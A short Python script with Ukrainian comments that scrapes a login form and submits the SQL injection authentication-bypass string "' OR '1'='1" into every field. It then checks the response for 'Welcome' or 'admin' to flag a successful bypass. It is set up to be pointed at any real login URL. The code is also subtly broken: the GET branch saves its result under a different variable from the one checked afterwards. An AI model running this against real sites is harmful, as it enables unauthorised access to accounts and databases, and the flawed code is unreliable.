import requests
from bs4 import BeautifulSoup

# URL of the page to scrape \ до сторінки з формою входу

target_url = "https://example.com/login"  # Replace with the actual URL

# тестовий payload SQL-ін'єкції
payload = "' OR '1'='1 "  # Replace with the actual payload

# пошук полів форми

session = requests.Session()
res = session.get(target_url)
soup = BeautifulSoup(res.text, "html.parser")
form = soup.find("form")

if not form:
    print("[-] форму не знайдено.")
    exit()


action = form.get("action")
method = form.get("method", "get").lower()
inputs = form.find_all("input")

#data = {}
#for input_tag in inputs:
#    name = input_tag.get("name")
#    if name:
#        # Додаємо SQL-ін'єкцію до поля логіна
#        if "login" in name.lower() or "username" in name.lower():
#            data[name] = payload
#        else:
#            data[name] = ""  # Порожнє поле для інших полів

data = {}
for input_tag in inputs:
    name = input_tag.get("name")
    if name:
        data[name] = payload
        
# Надсилаємо запит з SQL-ін'єкцією
url = action if "http" in action else target_url + action
if method == "post":
    response = session.post(url, data=data)
else:
    res = session.get(url, params=data)

# Перевірка на ознаки успішної SQL-ін'єкції
if "Welcome" in response.text or "admin" in response.text:
    print("[+] Можлива SQL-ін'єкція знайдена!")
else:
    print("[-] Сторінка схоже захищена (або результат не очевидний).")
    